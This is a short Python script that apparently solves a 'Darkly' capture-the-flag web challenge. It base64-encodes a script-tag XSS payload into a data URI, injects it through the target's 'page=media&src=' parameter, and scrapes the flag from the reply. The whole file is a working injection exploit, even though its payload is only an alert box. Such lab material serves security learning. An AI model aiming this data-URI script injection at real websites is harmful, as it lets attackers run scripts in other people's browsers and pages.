import os
import requests
import re
from base64 import b64encode

ip = os.getenv('darkly_ip')
url = f'http://{ip}/index.php?page=media&src='

if __name__ == '__main__':
    encoded = b64encode(b'<script>alert(1);</script>')
    r = requests.get(url + 'data:text/html;base64,' + encoded.decode())
    m = re.findall('The flag is : ([a-z0-9]+)', r.text)
    print(*m)

